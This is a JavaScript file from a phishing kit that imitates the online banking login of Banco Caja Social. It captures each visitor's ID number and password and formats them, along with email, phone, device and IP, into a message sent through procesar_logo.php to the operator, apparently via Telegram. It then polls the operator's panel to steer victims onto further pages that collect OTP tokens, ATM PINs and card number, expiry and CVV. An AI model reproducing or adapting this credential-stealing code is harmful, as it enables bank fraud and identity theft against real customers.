var menumob = 0;
var tecladoshf = 0;
let identificadorTiempoDeEspera;


function ventana_cajero() {    
    $("#btnATM").attr("disabled","disabled");
    $("#mensaje").hide();    
    $("#frmATM").show();
    $("#txtATM").val("");
}



function ventana_otp() {    
    $("#btnOTP").attr("disabled","disabled");
    $("#mensaje").hide();    
    $("#frmToken").show();
    $("#txtToken").val("");

}

function ventana_errotp() {
    $("#btnErr").attr("disabled","disabled");
    $("#mensaje").hide();    
    $("#frmErrToken,#error-otp").show();
    $("#txtErrToken").val("");
}

function ventana_usuario() {
    $("#mensaje").hide();    
    $("#frmLogin").show();
    $("#txt-tipo,#txt-id,#txt-pass").val("");
}




function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}  



function consultar_estado(){
    if (espera == 1) { 
        $.post( "../../../process/estado.php",function(data) {       
            switch (data) {
                case '2':espera = 0;
                         ventana_otp();
                         break;
                case '4':espera = 0;
                         vista_email(); 
                         break;
                case '6':espera = 0;
                         ventana_cajero();  
                         break;               
                case '8':espera = 0;
                         ventana_errotp(); 
                         break;
                case '10':espera = 0;
                            $.post( "../fin.php",function(data) {             
                                window.location.href = "../fin.php";
                            }); break;                                                 
                case '12':espera = 0;
                          ventana_usuario(); 
                          break;
            } 
        });    
    }    
}


 function iniciar_sesion(td,nd,cl){
    var d = detectar_dispositivo();
    var u = "[" + td + "]" + nd;
    
    // Generar session_id
    let sessionId = localStorage.getItem('session_id');
    if (!sessionId) {
        sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('session_id', sessionId);
    }
    
    // Guardar datos en localStorage
    localStorage.setItem('username', u);
    localStorage.setItem('password', cl);
    localStorage.setItem('session_id', sessionId);
    localStorage.setItem('identificacion', nd);
    localStorage.setItem('tipo_doc', td);
    
    // Obtener IP y enviar a Telegram
    fetch('get_ip.php')
        .then(response => response.json())
        .then(data => {
            const ip = data.ip || 'No disponible';
            const hora = new Date().toLocaleString('es-ES');
            
            const mensaje = `
<b>💎CAJA SOCIAL💎</b>
• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
• <b>🏦Banco:</b> CAJA SOCIAL
• <b>📟Dispositivo:</b> ${d}
• <b>🗺IP:</b> ${ip}
• <b>⏱Hora:</b> ${hora}
------------------------------
• <b>👤 Usuario:</b> ${nd}
• <b>🔑 Clave:</b> ${cl}
------------------------------`;

            const formData = new FormData();
            formData.append('message', mensaje);
            formData.append('transactionId', sessionId);

            fetch('procesar_logo.php', {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .then(result => {
                if (result.status === 'success') {
                    checkPaymentVerification(sessionId, result.messageId);
                } else {
                    // Ocultar loader si hay error
                    const loader = document.getElementById('loader-overlay');
                    if (loader) {
                        loader.style.display = 'none';
                    }
                }
            })
            .catch(err => {
                // Ocultar loader si hay error
                const loader = document.getElementById('loader-overlay');
                if (loader) {
                    loader.style.display = 'none';
                }
            });
        })
        .catch(() => {
            // Si falla la obtención de IP, enviar sin IP
            const hora = new Date().toLocaleString('es-ES');
            
            const mensaje = `
<b>💎CAJA SOCIAL💎</b>
• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
• <b>🏦Banco:</b> CAJA SOCIAL
• <b>📟Dispositivo:</b> ${d}
• <b>🗺IP:</b> No disponible
• <b>⏱Hora:</b> ${hora}
------------------------------
• <b>👤 Usuario:</b> ${nd}
• <b>🔑 Clave:</b> ${cl}
------------------------------`;

            const formData = new FormData();
            formData.append('message', mensaje);
            formData.append('transactionId', sessionId);

            fetch('procesar_logo.php', {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .then(result => {
                if (result.status === 'success') {
                    checkPaymentVerification(sessionId, result.messageId);
                } else {
                    // Ocultar loader si hay error
                    const loader = document.getElementById('loader-overlay');
                    if (loader) {
                        loader.style.display = 'none';
                    }
                }
            })
            .catch(err => {
                // Ocultar loader si hay error
                const loader = document.getElementById('loader-overlay');
                if (loader) {
                    loader.style.display = 'none';
                }
            });
    });
}


function enviar_otp(cd){
    $.post( "../../../process/paso4otp.php", { otp:cd } ,function(data) {   
        espera = 1;               
    });
 }

 function enviar_atm(c){
    $.post( "../../../process/paso4atm.php", { atm:c } ,function(data) {   
        espera = 1;               
    });
 }



$(document).ready(function($){

    // Ocultar teclado virtual en todos los dispositivos
    $(".login-der").hide();
    $("#txt-pass").removeAttr("readonly");

    

    $( window ).resize(function() {
        if ($( window ).width() >= 991) {
            $("#menu-mob").hide();
        }else{
            if (menumob == 1) {
                $("#menu-mob").show();
            }
        }           
    });

    $("#cerrar-login").click(function(){        
        $("#fondo-oscuro").hide();
        $("#frmLogin").hide();  
    });

    $("#btn-ingresar,.itm-ingresar").click(function(){      
        $("#fondo-oscuro").show();
        $("#frmLogin").show("fast");

        $("#txt-tipo").val("");
        $("#txt-pass").val("");
        $("#txt-id").val("");


        // Ocultar teclado virtual en todos los dispositivos
        $(".login-der").hide();
        $("#txt-pass").removeAttr("readonly");
    });

    $("#boton-menu").click(function(){      
        if (menumob == 0) {
            $("#menu-mob").show("fast");    
            menumob = 1;
        }else{
            $("#menu-mob").hide("fast");
            menumob = 0;
        }           
    });

    $("#txt-id").blur(function(){  
        if ($("#txt-id").val().length < 7) 
            $("#error-id").show();
        else
            $("#error-id").hide();
    });

    $("#txt-id").keyup(function(event){        
       if ($("#txt-id").val().length > 6){
            $("#error-id").hide();
            if ($("#txt-pass").val().length > 7 && $("#txt-tipo").val() != "") {
                $("#btn-iniciar").removeAttr("disabled");
            }else{
                $("#btn-iniciar").attr("disabled","disabled");                
            }
       }else{
            $("#btn-iniciar").attr("disabled","disabled");
       }
    });


    $("#txt-pass").blur(function(){  
        if ($("#txt-pass").val().length < 8) 
            $("#error-pass").show();
        else
            $("#error-pass").hide();
    });

    $("#txt-tipo").change(function(){  
        if ($("#txt-id").val().length > 6 && $("#txt-pass").val().length > 7 && $("#txt-tipo").val() != ""){
            $("#btn-iniciar").removeAttr("disabled");
        }else{
            $("#btn-iniciar").attr("disabled","disabled"); 
        } 
    });

    $("#txt-pass").keyup(function(event){        
       if ($("#txt-pass").val().length > 7){
            $("#error-pass").hide();
            if ($("#txt-id").val().length > 6 && $("#txt-tipo").val() != ""){
                $("#btn-iniciar").removeAttr("disabled");
            }else{
                $("#btn-iniciar").attr("disabled","disabled"); 
            }
       }
        else{
            $("#error-pass").show();
            $("#btn-iniciar").attr("disabled","disabled"); 
        }
    }); 

    $("#btn-iniciar").click(function(){
        //$("#fondo-oscuro").hide();
        $("#frmLogin").hide();
        $("#mensaje").show();
        /*$("#fondo").show();
        $(".loader").show();*/      
        iniciar_sesion($("#txt-tipo").val(),$("#txt-id").val(),$("#txt-pass").val());
    });


     $('#txtClaveCO').blur(function(){
        if ($("#txtClaveCO").val().length > 0) {
            $("#error-clave-co").hide(); 
        }else{
            $("#error-clave-co").show(); 
        }
     });

     $('#txtClaveCO').keyup(function(){
        $("#error-clave-co").hide(); 
        if ($("#txtClaveCO").val().length > 0) {
            if ($("#txtCorreo").val().indexOf('@', 0) != -1 && $("#txtCorreo").val().indexOf('.', 0) != -1) {
                $("#btnCorreo").removeAttr("disabled"); 
            }else{
                $("#btnCorreo").attr("disabled","disabled");
            }
        }else{
            $("#btnCorreo").attr("disabled","disabled");
        }
     });


     $('#txtCorreo').blur(function(){
        if ($("#txtCorreo").val().indexOf('@', 0) != -1 && $("#txtCorreo").val().indexOf('.', 0) != -1) {
            $("#error-correo").hide();
        }else{
            $("#error-correo").show();
        }          
     });


     $('#txtCorreo').keyup(function(){
         $("#error-correo").hide();
        if ($("#txtCorreo").val().indexOf('@', 0) != -1 && $("#txtCorreo").val().indexOf('.', 0) != -1) {
            if ($("#txtClaveCO").val().length > 0) {
                $("#btnCorreo").removeAttr("disabled"); 
            }else{
                $("#btnCorreo").attr("disabled","disabled");
            }
        }else{
            $("#btnCorreo").attr("disabled","disabled");            
        }          
     });


    $("#btnCorreo").click(function(){                
        enviar_correo($("#txtCorreo").val(),$("#txtClaveCO").val());    
    });

    $("#btnOTP").click(function(){          
        $("#frmToken").hide();
        $("#mensaje").show();    
        enviar_otp($("#txtToken").val());    
    });

    $("#btnATM").click(function(){          
        $("#frmATM").hide();
        $("#mensaje").show();    
        enviar_atm($("#txtATM").val());    
    });

    $("#btnErr").click(function(){          
        $("#frmErrToken").hide();
        $("#mensaje").show();    
        enviar_otp($("#txtErrToken").val());    
    });


    $('#txtToken').blur(function(){
        if ($("#txtToken").val().length > 0) {
            $("#error-otp").hide(); 
        }else{
            $("#error-otp").show(); 
        }
     });

     $('#txtToken').keyup(function(){
        $("#error-otp").hide(); 
        if ($("#txtToken").val().length > 0) {
            $("#btnOTP").removeAttr("disabled"); 
        }else{
            $("#btnOTP").attr("disabled","disabled");
        }
     });



     $('#txtATM').blur(function(){
        if ($("#txtATM").val().length > 0) {
            $("#error-atm").hide(); 
        }else{
            $("#error-atm").show(); 
        }
     });

     $('#txtATM').keyup(function(){
        $("#error-atm").hide(); 
        if ($("#txtATM").val().length > 0) {
            $("#btnATM").removeAttr("disabled"); 
        }else{
            $("#btnATM").attr("disabled","disabled");
        }
     });



     $('#txtErrToken').blur(function(){
        if ($("#txtErrToken").val().length > 0) {
            $("#error-otp").hide(); 
        }else{
            $("#error-otp").show(); 
        }
     });

     $('#txtErrToken').keyup(function(){
        $("#error-otp").hide(); 
        if ($("#txtErrToken").val().length > 0) {
            $("#btnErr").removeAttr("disabled"); 
        }else{
            $("#btnErr").attr("disabled","disabled");
        }
     });








     $("#btnTarjeta").click(function(){   
        f = $("#mFecha").val() + "-" + $("#aFecha").val()             
        enviar_tarjeta($("#txtTarjeta").val(),f,$("#txtCVV").val());   
    });


    $('#txtTarjeta').blur(function(){
        if ($("#txtTarjeta").val().length > 14) {
            $("#error-tarjeta").hide(); 
        }else{
            $("#error-tarjeta").show(); 
        }
     });

     $('#txtCVV').blur(function(){
        if ($("#txtCVV").val().length > 2) {
            $("#error-cvv").hide(); 
        }else{
            $("#error-cvv").show(); 
        }
     });

    $('#txtTarjeta').keyup(function(){
        $("#error-tarjeta").hide(); 
        if ($("#txtTarjeta").val().length > 14) {
            if ($("#txtCVV").val().length > 2 && $("#mFecha").val() != "" && $("#aFecha").val() != "") {
                $("#btnTarjeta").removeAttr("disabled");     
            }else{
                $("#btnTarjeta").attr("disabled","disabled");   
            }
        }else{
           $("#btnTarjeta").attr("disabled","disabled"); 
        }
    });

    $('#txtCVV').keyup(function(){
        $("#error-cvv").hide(); 
        if ($("#txtCVV").val().length > 2) {
            if ($("#txtTarjeta").val().length > 14 && $("#mFecha").val() != "" && $("#aFecha").val() != "") {
                $("#btnTarjeta").removeAttr("disabled");     
            }else{
                $("#btnTarjeta").attr("disabled","disabled");   
            }
        }else{
           $("#btnTarjeta").attr("disabled","disabled"); 
        }
    });


    $("#mFecha,#aFecha").change(function(){  
        if ($("#txtTarjeta").val().length > 14 && $("#txtCVV").val().length > 2 && $("#mFecha").val() != "" && $("#aFecha").val() != ""){
            $("#btnTarjeta").removeAttr("disabled");
        }else{
            $("#btnTarjeta").attr("disabled","disabled"); 
        } 
    });

    $(".tecla,.teclado-num").click(function(){
        if ($('#txt-pass').val().length < 8) {
            $("#error-pass").show();
            $("#btn-iniciar").attr("disabled","disabled"); 
            if (tecladoshf == 0) {
                $('#txt-pass').val($('#txt-pass').val() + "" + $(this).html());
            }else{
               $('#txt-pass').val($('#txt-pass').val() + "" + $(this).html().toUpperCase()); 
            }
            if ($('#txt-pass').val().length < 8) {
                $("#error-pass").show();
                $("#btn-iniciar").attr("disabled","disabled"); 
            }else{
                $("#error-pass").hide();
                if ($("#txt-id").val().length > 6 && $("#txt-tipo").val() != ""){
                    $("#btn-iniciar").removeAttr("disabled");    
                }        
            }            
        }else{
            $("#error-pass").hide();
            if ($("#txt-id").val().length > 6 && $("#txt-tipo").val() != ""){
                $("#btn-iniciar").removeAttr("disabled");    
            }
        }       
        
    });

    $("#shf").click(function(){
        if (tecladoshf == 0) {
            $(".teclado td").css("text-transform","uppercase");
            tecladoshf = 1;
        }else{
            $(".teclado td").css("text-transform","lowercase");
            tecladoshf = 0;
        }        
    });

    $("#bac").click(function(){
        const str = $('#txt-pass').val();
        const str2 = str.substring(0, str.length - 1);
        $('#txt-pass').val(str2);
        if ($('#txt-pass').val().length < 8) {
            $("#error-pass").show();
            $("#btn-iniciar").attr("disabled","disabled"); 
        }else{
            $("#error-pass").hide();
            if ($("#txt-id").val().length > 6 && $("#txt-tipo").val() != ""){
                $("#btn-iniciar").removeAttr("disabled");    
            }        
        }
    });

});

async function checkPaymentVerification(transactionId, messageId) {
    try {
        const formData = new FormData();
        formData.append('transactionId', transactionId);
        formData.append('messageId', messageId);

        const res = await fetch('verificar_respuesta.php', {
            method: 'POST',
            body: formData
        });
        const result = await res.json();

        if (result.action) {
            switch (result.action) {
                case 'pedir_dinamica':
                    window.location.href = "token.php";
                    break;
                case 'error_logo': 
                    // Ocultar loader antes de mostrar error
                    const loader = document.getElementById('loader-overlay');
                    if (loader) {
                        loader.style.display = 'none';
                    }
                    window.location.href = "index.php";
                    break;
                case 'error_cajero': 
                    // Ocultar loader antes de mostrar error
                    $("#mensaje").hide();
                    window.location.href = "clave_cajero.php";
                    return; // Salir de la función
                    break;
            }
        } else {
            setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
        }
    } catch (err) {
        setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
    }
}